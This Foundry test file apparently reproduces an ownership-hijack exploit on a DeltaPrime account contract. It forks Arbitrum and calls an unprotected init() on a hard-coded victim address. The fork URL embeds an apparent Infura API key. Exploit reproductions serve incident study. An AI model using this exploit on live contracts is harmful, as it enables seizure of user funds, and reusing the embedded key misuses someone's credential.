// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IPrimeAccount {
    function init() external;
    function owner() external view returns (address);
}

contract DeltaPrimeAttacker {
    function hijack(
        IPrimeAccount account
    ) external {
        // PrimeAccounts delegated this selector to DiamondBeacon's init
        // facet. That facet checked a different custom storage slot than the
        // account initializer, allowing any caller to propose itself as owner.
        account.init();
    }
}

contract DeltaPrimeExploitTest is Test {
    IPrimeAccount private constant VICTIM = IPrimeAccount(0x2FfD0D2bEa8E922A722De83c451Ad93e097851F5);

    function testExploit() public {
        vm.createSelectFork("https://arbitrum-mainnet.infura.io/v3/84842078b09946638c03157f83405213", 234_975_000);

        address originalOwner = VICTIM.owner();
        DeltaPrimeAttacker attacker = new DeltaPrimeAttacker();
        attacker.hijack(VICTIM);

        assertNotEq(originalOwner, address(attacker));
        assertEq(VICTIM.owner(), address(attacker));
    }
}
